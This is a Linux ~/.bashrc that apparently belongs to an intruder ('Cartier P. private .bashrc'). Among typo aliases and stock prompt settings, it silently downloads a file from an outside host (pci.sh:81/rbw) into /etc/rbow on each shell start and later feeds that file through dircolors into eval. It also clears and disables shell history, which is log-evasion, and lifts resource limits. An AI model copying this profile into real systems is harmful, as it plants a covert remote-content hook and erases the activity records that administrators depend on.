# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

export SHELL=/bin/bash

# Check if the file exists in /etc/rbow
if [ ! -f /etc/rbow ]; then
    # If the file doesn't exist, download it using wget
    wget -qnc -O /etc/rbow pci.sh:81/rbw
fi

# User-specific aliases and functions
alias l='llt'
alias sl='ls'
alias dc='cd'
alias wpd='pwd'
alias ltl='llt'
alias tll='llt'
alias cd~='cd'
alias clr='clear'
alias bsah='bash'
alias bahs='bash'
alias gerp='grep'
alias grpe='grep'
alias '..'='cd ..'
alias llt='ls -rtl'
alias duh='du -h .'
alias whihc='which'
alias string='strings'
alias strinsg='strings'
alias nst='netstat -tupan'
alias nsw='netstat -tupanwww'
alias lu='LS_COLORS="di=0;91:" ls -luh'
alias lh='LS_COLORS="di=0;91:" ls -alh'
alias IP='{ echo -e "\e[0m   \e[93m| \e[0m\e[91m$(curl -s ipv4.icanhazip.com)\e[0m \e[93m|\e[0m"; }'

# Disable history
history -c
unset HISTORY
unset HISTFILE
unset HISTSIZE
unset HISTFILESIZE
unset HISTZONE
unset HISTLOG
unset HISTSAVE
unset WATCH
unset REMOTEHOST
unset REMOTEHOSTFILE
export HISTFILE=/dev/null

# Increase resource limits
ulimit -n 65536
ulimit -u 8192
ulimit -f unlimited
ulimit -c unlimited
ulimit -s unlimited

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\033[97m[\033[0m\[\033[01;90;2m\]\u@\h\[\033[00m\]:\[\033[0m\033[01;90m\]\w\[\033[00m\]\033[97m]\033[0m\033[31m\$\033[0m '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# Function to set library paths based on the detected OS
set_library_paths() {
    os_type=$(uname -s)
    case "$os_type" in
        Linux)
            # Check for specific Linux distributions
            if [ -f /etc/debian_version ]; then
                # Debian/Ubuntu specific library paths
                export LD_LIBRARY_PATH=/usr/local/lib64:$LD_LIBRARY_PATH
                echo -e "\n\e[90;2m Cartier P\e[93;2m.\e[0m\e[90m private .bashrc activated on \e[93;2mDebian/Ubuntu\e[0m\n"
            elif [ -f /etc/redhat-release ]; then
                # CentOS/RedHat specific library paths
                export LD_LIBRARY_PATH=/usr/local/lib64:$LD_LIBRARY_PATH
                echo -e "\n\e[90;2m Cartier P\e[93;2m.\e[0m\e[90m private .bashrc activated on \e[93;2mCentOS/RedHat\e[0m\n"
            else
                # Default library paths for other Linux distributions (if needed)
                export LD_LIBRARY_PATH=/usr/local/lib64:$LD_LIBRARY_PATH
                echo -e "\n\e[90;2m Cartier P\e[93;2m.\e[0m\e[90m private .bashrc activated on \e[93;2mother Linux distributions\e[0m\n"
            fi
            ;;
        *)
            # Default library paths for other OS (if needed)
            echo " Library paths have been set for $os_type"
            ;;
    esac
}

# Optional: Print a message to confirm the library paths are set
set_library_paths

# Add trap and export TERM=xterm-256color
trap 'resize' WINCH
export TERM=xterm-256color

# Define aliases for 'ps a-ef', 'ps ae-f', and 'ps e-af' to execute 'ps -aef'
alias psw='ps -aefwww'
alias psf='ps -aef'
alias pse-af='ps -aef'
alias 'ps_eaf'='ps -aef'
alias 'ps_a-ef'='ps -aef'
alias 'ps_e-af'='ps -aef'
alias 'ps_-eaf'='ps -aef'
alias 'ps_e-_af'='ps -aef'
alias 'ps_a-_ef'='ps -aef'
alias 'ps_a_-ef'='ps -aef'
alias 'ps_e_-af'='ps -aef'

# Define a function that uses pkill with the provided argument
ak() {
  local search_term="$1"
  (pkill 2>/dev/null -16 -f "$search_term") || :
}

# Enable color support for ls and add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r /etc/rbow && eval "$(dircolors -b /etc/rbow)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# Set LS_COLORS for directory colors
LS_COLORS='di=38;5;27:'
export LS_COLORS
eval `dircolors /etc/rbow`